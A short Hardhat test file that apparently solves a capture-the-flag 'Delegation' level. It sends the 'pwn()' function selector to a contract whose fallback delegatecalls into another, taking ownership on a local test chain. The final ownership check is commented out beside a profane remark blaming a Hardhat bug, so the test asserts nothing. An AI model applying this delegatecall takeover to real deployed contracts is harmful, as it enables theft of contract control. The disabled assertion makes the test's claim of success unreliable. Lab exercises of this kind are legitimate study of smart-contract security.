import { expect } from "chai";
import { ethers } from "hardhat";
import { Delegate, Delegation } from "../typechain-types";

describe("Delegation", function () {

  let delegate: Delegate;
  let delegation: Delegation;

  beforeEach(async function () {
    const accounts = await ethers.getSigners();

    const delegateFactory = await ethers.getContractFactory("Delegate");
    delegate = await delegateFactory.deploy(accounts[0].address);
    await delegate.deployed();

    const delegationFactory = await ethers.getContractFactory("Delegation");
    delegation = await delegationFactory.deploy(delegate.address);
    await delegation.deployed();
  });

  it("Should delegation and get owner success", async function () {
    const accounts = await ethers.getSigners();

    const tx = await accounts[1].sendTransaction({
      to: delegation.address,
      data: ethers.utils.id("pwn()").substring(0, 10)
    });

    await tx.wait();

    // fuck, it is a hardhat bug
    // expect(await delegate.owner()).to.equal(accounts[1].address);
  });

});
